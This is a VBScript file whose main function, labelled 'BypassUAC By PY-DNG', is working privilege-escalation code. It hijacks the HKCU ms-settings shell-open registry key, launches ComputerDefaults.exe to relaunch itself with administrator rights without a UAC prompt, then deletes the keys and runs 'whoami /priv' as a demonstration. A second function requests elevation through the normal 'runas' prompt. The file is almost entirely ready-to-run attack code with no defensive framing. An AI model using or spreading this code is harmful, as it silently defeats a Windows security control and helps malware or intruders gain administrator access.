Dim FSO, ws, SA, ADO, wn
Dim SelfFolderPath, UserName, Self
Set FSO = CreateObject("Scripting.FileSystemObject")
Set ws = CreateObject("Wscript.Shell")
Set SA = CreateObject("Shell.Application")
'Set ADO = CreateObject("ADODB.STREAM")
'Set wn = CreateObject("Wscript.Network")

Call BypassUAC(1, False)

SelfFolderPath = FormatPath(FSO.GetFile(WScript.ScriptFullName).ParentFolder.Path)
'UserName = wn.UserName
'Self = FSO.OpenTextFile(Wscript.ScriptFullName).ReadAll

ws.Run "cmd /k whoami /priv"



Function BypassUAC(ByVal Host, ByVal Hide)
	''' BypassUAC By PY-DNG; Version 1.0 '''
	On Error Resume Next: Err.Clear
	Dim HostName, Args, i, Argv, TFPath, HaveUAC
	If Host = 1 Then HostName = "wscript.exe"
	If Host = 2 Then HostName = "cscript.exe"
	' Get All Arguments
	Set Argv = WScript.Arguments
	For Each Arg in Argv
		Args = Args & " " & Chr(34) & Arg & Chr(34)
	Next
	' Test If We Have UAC
	TFPath = FSO.GetSpecialFolder(WindowsFolder) & "\system32\UACTestFile"
	FSO.CreateTextFile TFPath, True
	HaveUAC = FSO.FileExists(TFPath) And Err.number <> 70
	If HaveUAC Then FSO.DeleteFile TFPath, True
	' If No UAC Then Get It Else Check & Correct The Host And Delete Regs
	If Not HaveUAC Then
		ws.RegWrite "HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\Command\DelegateExecute", "", "REG_SZ"
		ws.RegWrite "HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\Command\", "wscript.exe " & Chr(34) & WScript.ScriptFullName & chr(34) & " uac" & Args, "REG_SZ"
		ws.Run "ComputerDefaults.exe"
		WScript.Quit
	ElseIf LCase(Right(WScript.FullName,12)) <> "\" & HostName Then
		ws.Run HostName & " //e:VBScript """ & WScript.ScriptFullName & """" & Args, Int(Hide)+1, False
		WScript.Quit
	Else
		ws.RegDelete "HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\Command\"
		ws.RegDelete "HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\"
		ws.RegDelete "HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\"
		ws.RegDelete "HKEY_CURRENT_USER\Software\Classes\ms-settings\"
	End If
	If Host = 2 Then ExecuteGlobal "Dim SI, SO: Set SI = Wscript.StdIn: Set SO = Wscript.StdOut"
End Function

Function GetUAC(ByVal Host, ByVal Hide)
	''' GetUAC By PY-DNG; Version 1.7 '''
	' 最近更新：更换了UAC判断方式，不再占用命令行参数，兼容了没有UAC机制的更老版本Windows系统（如XP，2003）；简化了代码的表示
	On Error Resume Next: Err.Clear
	Dim HostName, Args, i, Argv, TFPath, HaveUAC
	If Host = 1 Then HostName = "wscript.exe"
	If Host = 2 Then HostName = "cscript.exe"
	' Get All Arguments
	Set Argv = WScript.Arguments
	For Each Arg in Argv
		Args = Args & " " & Chr(34) & Arg & Chr(34)
	Next
	' Test If We Have UAC
	TFPath = FSO.GetSpecialFolder(WindowsFolder) & "\system32\UACTestFile"
	FSO.CreateTextFile TFPath, True
	HaveUAC = FSO.FileExists(TFPath) And Err.number <> 70
	If HaveUAC Then FSO.DeleteFile TFPath, True
	' If No UAC Then Get It Else Check & Correct The Host
	If Not HaveUAC Then
		SA.ShellExecute "wscript.exe", "//e:VBScript " & Chr(34) & WScript.ScriptFullName & chr(34) & Args, "", "runas", 1
		WScript.Quit
	ElseIf LCase(Right(WScript.FullName,12)) <> "\" & HostName Then
		ws.Run HostName & " //e:VBScript """ & WScript.ScriptFullName & """" & Args, Int(Hide)+1, False
		WScript.Quit
	End If
	If Host = 2 Then ExecuteGlobal "Dim SI, SO: Set SI = Wscript.StdIn: Set SO = Wscript.StdOut"
End Function


Function FormatPath(ByVal Path)
	If Not Right(Path, 1) = "\" Then
		Path = Path & "\"
	End If
	FormatPath = Path
End Function

Function CreateTempPath(ByVal IsFolder)
	Dim TempPath
	TempPath = FSO.GetSpecialFolder(2) & "\" & FSO.GetTempName()
	If IsFolder Then TempPath = FormatPath(TempPath)
	CreateTempPath = TempPath
End Function